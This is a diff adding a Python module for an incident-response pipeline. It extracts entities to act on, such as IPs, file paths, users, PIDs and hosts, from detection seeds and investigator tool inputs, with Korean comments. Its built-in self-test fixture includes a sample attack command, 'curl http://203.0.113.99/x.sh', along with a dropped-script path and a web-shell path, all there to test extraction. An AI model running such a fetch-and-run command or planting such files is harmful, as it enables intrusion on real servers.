@@ -1,0 +1,190 @@
+"""조치 대상(엔티티) 추출 — 설계 문서 5절.
+
+LLM 자연어(evidence_chain, final_verdict.summary/attack_type 등)에서는 절대
+추출하지 않는다. 1차 탐지가 코드로 뽑은 initial_seed.detection.rules[].detail과
+조사 에이전트가 실제로 조회에 쓴 tools_called[].input만 쓴다(5-1절 출처 우선순위).
+"""
+
+from __future__ import annotations
+
+import os
+import re
+import sys
+from dataclasses import dataclass
+from typing import Any, Mapping, Optional
+
+_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+if _ROOT not in sys.path:
+    sys.path.insert(0, _ROOT)
+
+from respond.contract import Contract  # noqa: E402
+
+_IPV4 = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")
+
+# fetch_audit_log에는 파일 경로 필터가 없다(5-3절) — path는 web/system 계층에서만 의미를 가진다.
+_FILE_LAYERS = ("system",)
+_WEB_LAYERS = ("web",)
+
+# 도구별로 "경로"가 어떤 의미인지 다르다(5-3절). fetch_audit_log 등 경로 의미가 없는 도구는
+# 여기 없으므로 자동으로 무시된다.
+_TOOL_PATH_KIND = {"fetch_web_log": "url_path"}
+_TOOL_IP_KEYS = ("src_ip", "dst_ip", "ip")
+
+
+@dataclass(frozen=True)
+class Entity:
+    kind: str       # "ip" | "file_path" | "url_path" | "user" | "pid" | "host"
+    value: str
+    source: str      # "seed_detail" | "seed_src_ip" | "seed_host" | "tool_input"
+
+
+def _from_seed_detail(initial_seed: Mapping[str, Any]) -> list:
+    entities: list = []
+    detection = initial_seed.get("detection")
+    if not isinstance(detection, Mapping):
+        return entities
+    rules = detection.get("rules")
+    if not isinstance(rules, list):
+        return entities
+
+    for rule in rules:
+        if not isinstance(rule, Mapping):
+            continue
+        layer = rule.get("layer")
+        detail = rule.get("detail")
+        if not isinstance(detail, Mapping):
+            continue
+
+        user = detail.get("user")
+        if isinstance(user, str) and user:
+            entities.append(Entity("user", user, "seed_detail"))
+
+        pid = detail.get("pid")
+        if isinstance(pid, int) and not isinstance(pid, bool):
+            entities.append(Entity("pid", str(pid), "seed_detail"))
+
+        path = detail.get("path")
+        if isinstance(path, str) and path:
+            if layer in _FILE_LAYERS:
+                entities.append(Entity("file_path", path, "seed_detail"))
+            elif layer in _WEB_LAYERS:
+                entities.append(Entity("url_path", path, "seed_detail"))
+            # auth 등 다른 계층의 path는 설계상 의미가 없어 추출하지 않는다(5-2절)
+
+        exec_args = detail.get("exec_args")
+        if isinstance(exec_args, str):
+            match = _IPV4.search(exec_args)
+            if match:
+                entities.append(Entity("ip", match.group(0), "seed_detail"))
+
+    return entities
+
+
+def _from_seed_root(initial_seed: Mapping[str, Any]) -> list:
+    entities: list = []
+    src_ip = initial_seed.get("src_ip")
+    if isinstance(src_ip, str) and src_ip:
+        entities.append(Entity("ip", src_ip, "seed_src_ip"))
+    host = initial_seed.get("host")
+    if isinstance(host, str) and host:
+        entities.append(Entity("host", host, "seed_host"))
+    return entities
+
+
+def _from_tools_called(tools_called: tuple) -> list:
+    entities: list = []
+    for call in tools_called:
+        tool_name = call.get("tool_name")
+        tool_input = call.get("input")
+        if not isinstance(tool_input, Mapping):
+            continue
+
+        for key in _TOOL_IP_KEYS:
+            value = tool_input.get(key)
+            if isinstance(value, str) and value:
+                entities.append(Entity("ip", value, "tool_input"))
+
+        user = tool_input.get("user")
+        if isinstance(user, str) and user:
+            entities.append(Entity("user", user, "tool_input"))
+
+        for key in ("pid", "ppid"):
+            value = tool_input.get(key)
+            if isinstance(value, int) and not isinstance(value, bool):
+                entities.append(Entity("pid", str(value), "tool_input"))
+
+        path = tool_input.get("path")
+        if isinstance(path, str) and path:
+            kind = _TOOL_PATH_KIND.get(tool_name)
+            if kind:
+                entities.append(Entity(kind, path, "tool_input"))
+
+    return entities
+
+
+def extract_entities(contract: Contract) -> tuple:
+    """1순위(seed_detail/seed_src_ip/seed_host) 다음 2순위(tool_input) 순서로 모은다.
+
+    같은 (kind, value)가 여러 출처에서 나오면 먼저 나온(더 신뢰도 높은) 것을 남긴다.
+    """
+    collected = (
+        _from_seed_detail(contract.initial_seed)
+        + _from_seed_root(contract.initial_seed)
+        + _from_tools_called(contract.tools_called)
+    )
+    seen: dict = {}
+    for entity in collected:
+        key = (entity.kind, entity.value)
+        if key not in seen:
+            seen[key] = entity
+    return tuple(seen.values())
+
+
+def first_of_kind(entities: tuple, kind: str) -> Optional[Entity]:
+    for entity in entities:
+        if entity.kind == kind:
+            return entity
+    return None
+
+
+if __name__ == "__main__":  # 자체 점검: python llm/respond/entities.py
+    from respond.contract import MappingView, Verdict
+
+    contract = Contract(
+        incident_id="INC-1", incident_key=None, investigation_id="INV-1",
+        investigation_status="COMPLETE", provenance_status="passed",
+        verdict=Verdict("THREAT_CONFIRMED", 0.8, "HIGH", "x", (), ""),
+        investigation_confidence=0.9, remaining_unknowns=(), tools_called=(
+            {"tool_name": "fetch_web_log", "input": {"src_ip": "198.51.100.9", "path": "/login"}},
+        ),
+        initial_seed={
+            "src_ip": "203.0.113.45", "host": "web-01",
+            "detection": {"rules": [
+                {"layer": "system", "detail": {"user": "www-data", "pid": 2051,
+                                                "path": "/var/www/html/.cache/x.sh",
+                                                "exec_args": "curl http://203.0.113.99/x.sh"}},
+                {"layer": "web", "detail": {"path": "/wp-content/uploads/shell.php"}},
+                {"layer": "auth", "detail": {"path": "/should/not/be/used"}},
+            ]},
+        },
+        mapping=MappingView("mapped", "passed", (), (), ()),
+    )
+
+    entities = extract_entities(contract)
+    kinds = {(e.kind, e.value) for e in entities}
+
+    assert ("ip", "203.0.113.45") in kinds          # seed_src_ip
+    assert ("host", "web-01") in kinds              # seed_host
+    assert ("user", "www-data") in kinds            # seed_detail
+    assert ("pid", "2051") in kinds                 # seed_detail
+    assert ("file_path", "/var/www/html/.cache/x.sh") in kinds   # system layer → 파일 경로
+    assert ("url_path", "/wp-content/uploads/shell.php") in kinds  # web layer → URL
+    assert ("file_path", "/wp-content/uploads/shell.php") not in kinds  # web path는 파일 격리 대상 아님
+    assert ("ip", "203.0.113.99") in kinds           # exec_args에서 뽑은 외부 IP
+    assert not any(e.value == "/should/not/be/used" for e in entities)  # auth 계층 path는 버림
+    assert ("ip", "198.51.100.9") in kinds           # tools_called[].input
+    assert ("url_path", "/login") in kinds           # fetch_web_log의 path는 URL
+
+    # 수집 순서상 seed_detail(exec_args의 IP)이 seed_src_ip보다 먼저 나온다
+    assert first_of_kind(entities, "ip").value == "203.0.113.99"
+    print("ok")
